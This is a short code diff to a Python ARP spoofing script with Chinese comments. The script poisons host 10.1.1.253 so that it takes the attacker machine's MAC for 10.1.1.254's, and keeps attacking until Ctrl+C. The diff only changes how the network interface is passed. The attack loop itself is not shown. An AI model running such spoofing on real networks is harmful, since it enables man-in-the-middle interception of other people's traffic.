@@ -30,9 +30,9 @@ def arp_spoof(ip_1, ip_2, ifname='Net1'):
     # 获取本机MAC地址，并且赋值到全局变量localmac
     localmac = get_mac_address(ifname)
     # 获取ip_1的真实MAC地址
-    ip_1_mac = arp_request(ip_1, ifname)[1]
+    ip_1_mac = arp_request(ip_1)[1]
     # 获取ip_2的真实MAC地址
-    ip_2_mac = arp_request(ip_2, ifname)[1]
+    ip_2_mac = arp_request(ip_2)[1]
     # 引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
     signal.signal(signal.SIGINT, sigint_handler)
     while True:  # 一直攻击，直到ctl+c出现！！！
@@ -66,4 +66,4 @@ def sigint_handler(signum, frame):  # 定义处理方法
 if __name__ == "__main__":
     # Windows Linux均可使用
     # 欺骗10.1.1.253 让它认为10.1.1.254的MAC地址为本地攻击者计算机的MAC
-    arp_spoof('10.1.1.253', '10.1.1.254', 'ens33')
+    arp_spoof('10.1.1.253', '10.1.1.254', 'Net1')
